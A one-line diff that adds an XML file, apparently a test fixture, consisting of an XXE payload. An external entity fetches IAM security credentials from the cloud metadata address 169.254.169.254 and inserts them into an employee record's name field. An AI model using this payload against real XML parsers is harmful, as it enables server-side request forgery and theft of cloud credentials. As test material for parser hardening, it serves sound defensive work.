@@ -1,0 +1,1 @@
+<!DOCTYPE root [ <!ENTITY lastname SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/mock-user" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
